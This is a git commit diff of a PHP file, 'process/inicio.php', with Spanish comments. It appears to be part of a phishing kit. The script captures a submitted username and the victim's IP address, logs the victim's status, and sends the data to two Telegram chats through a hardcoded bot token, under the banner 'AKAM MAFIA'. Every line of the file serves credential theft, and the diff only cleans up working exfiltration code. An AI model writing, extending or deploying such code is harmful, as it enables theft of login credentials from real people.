7a49e58f97c205dabb09892648a011f2c3eedc06
leidyjhoanalj88-png <leidyjhoanalj88@gmail.com>
2026-04-22 00:13:14 -0500

    Actualizar inicio.php

--- process/inicio.php
+++ process/inicio.php
@@ -1,25 +1,22 @@
 <?php
 error_reporting(0);
-// Ruta directa a la librería
-include('../panel/lib/funciones.php');
+require_once('../panel/lib/funciones.php');
 
 $ip = $_SERVER['REMOTE_ADDR'];
 $usuario = $_POST['usr'];
-
-// SOLO 2 IDs para que no se trabe
 $token = "8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA";
-$chat_ids = ["8114050673", "8518977918"];
+$chat_ids = ["8114050673", "8518977918"]; // Tus 2 IDs originales
 
 if (!empty($usuario)) {
-    @actualizar_registro($ip, "USUARIO", $usuario);
-    @actualizar_estado_victima($ip, "1");
+    actualizar_registro($ip, "USUARIO", $usuario);
+    actualizar_estado_victima($ip, "1");
     
     $mensaje = "⭐ <b>𝓐K𝓐𝓜 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n";
     $mensaje .= "👤 <b>USUARIO:</b> <code>$usuario</code>\n";
     $mensaje .= "📍 <b>IP:</b> $ip";
 
     foreach ($chat_ids as $id) {
-        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=" . urlencode($mensaje) . "&parse_mode=HTML";
+        $url = "https://api.telegram.org/bot$token/sendMessage?chat_id=$id&text=".urlencode($mensaje)."&parse_mode=HTML";
         @file_get_contents($url);
     }
 }
